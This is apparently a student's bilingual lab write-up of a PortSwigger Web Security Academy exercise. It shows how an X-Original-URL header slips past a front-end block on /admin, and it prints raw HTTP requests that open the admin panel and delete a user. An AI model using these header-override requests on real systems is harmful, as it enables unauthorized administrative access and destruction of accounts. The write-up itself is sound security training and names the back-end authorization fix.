# Lab 05 — URL-Based Access Control Can Be Circumvented

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** Access Control  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-08

### Descrição

O painel `/admin` existe, mas um sistema de front-end bloqueia requisições externas para esse caminho. O back-end, porém, suporta o header `X-Original-URL`, que permite sobrescrever a URL processada internamente. O objetivo é contornar o bloqueio e excluir o usuário `carlos`.

### Conceito

Alguns frameworks de back-end respeitam headers HTTP não padrão como `X-Original-URL` ou `X-Rewrite-URL` para determinar qual rota processar — independentemente da URL real da requisição. Quando o sistema de controle de acesso (como um WAF ou proxy reverso de front-end) analisa apenas a URL da requisição e não esses headers, é possível enganá-lo: a URL visível para o bloqueador aponta para `/`, enquanto o back-end processa `/admin`.

### Reconhecimento

Ao tentar acessar `/admin` diretamente, o servidor retornou acesso negado — uma resposta simples e genérica, indicando que o bloqueio era feito pela camada de front-end, não pelo back-end.

Para confirmar se o back-end processava o header `X-Original-URL`, foi enviada uma requisição de teste com um caminho inválido:

```
GET / HTTP/1.1
X-Original-URL: /invalid
```

O servidor retornou `404 Not Found` — confirmando que o back-end estava processando o caminho definido no header, não na URL real.

### Exploração

**Passo 1 — Acessar o painel admin**

```
GET / HTTP/1.1
X-Original-URL: /admin
```

O bloqueio de front-end vê uma requisição para `/` e deixa passar. O back-end processa `/admin` e retorna o painel.

**Passo 2 — Excluir o usuário carlos**

Para executar a exclusão, os parâmetros foram adicionados à query string da URL real, enquanto o header apontava para o endpoint de exclusão:

```
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Solução

Usar o header `X-Original-URL` para contornar o bloqueio de front-end, primeiro acessando `/admin` e depois executando `/admin/delete?username=carlos`.

### O que aprendi

- Headers como `X-Original-URL` e `X-Rewrite-URL` podem sobrescrever a rota processada pelo back-end em certos frameworks
- Controles de acesso aplicados apenas na camada de front-end são bypassáveis se o back-end não realiza sua própria verificação
- A defesa correta é validar autorização no back-end, independentemente de qualquer camada intermediária

### Referências

- [PortSwigger — Access Control](https://portswigger.net/web-security/access-control)
- [PortSwigger — HTTP Header Injection](https://portswigger.net/web-security/host-header)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** Access Control  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-08

### Description

The `/admin` panel exists, but a front-end system blocks external requests to that path. The back-end, however, supports the `X-Original-URL` header, which allows overriding the internally processed URL. The goal is to bypass the block and delete user `carlos`.

### Concept

Some back-end frameworks honor non-standard HTTP headers like `X-Original-URL` or `X-Rewrite-URL` to determine which route to process — regardless of the actual request URL. When the access control system (such as a WAF or front-end reverse proxy) only analyzes the request URL and not these headers, it can be deceived: the URL visible to the blocker points to `/`, while the back-end processes `/admin`.

### Reconnaissance

Attempting to access `/admin` directly returned an access denied response — simple and generic, indicating the block was at the front-end layer, not the back-end.

To confirm whether the back-end processed the `X-Original-URL` header, a test request was sent with an invalid path:

```
GET / HTTP/1.1
X-Original-URL: /invalid
```

The server returned `404 Not Found` — confirming the back-end was processing the path defined in the header, not the actual URL.

### Exploitation

**Step 1 — Access the admin panel**

```
GET / HTTP/1.1
X-Original-URL: /admin
```

The front-end blocker sees a request to `/` and lets it through. The back-end processes `/admin` and returns the panel.

**Step 2 — Delete user carlos**

To execute the deletion, parameters were added to the actual URL's query string while the header pointed to the deletion endpoint:

```
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Solution

Use the `X-Original-URL` header to bypass the front-end block, first accessing `/admin` then executing `/admin/delete?username=carlos`.

### What I learned

- Headers like `X-Original-URL` and `X-Rewrite-URL` can override the route processed by the back-end in certain frameworks
- Access controls applied only at the front-end layer are bypassable if the back-end doesn't perform its own verification
- The correct defense is to validate authorization in the back-end, regardless of any intermediate layer

### References

- [PortSwigger — Access Control](https://portswigger.net/web-security/access-control)
- [PortSwigger — HTTP Header Injection](https://portswigger.net/web-security/host-header)
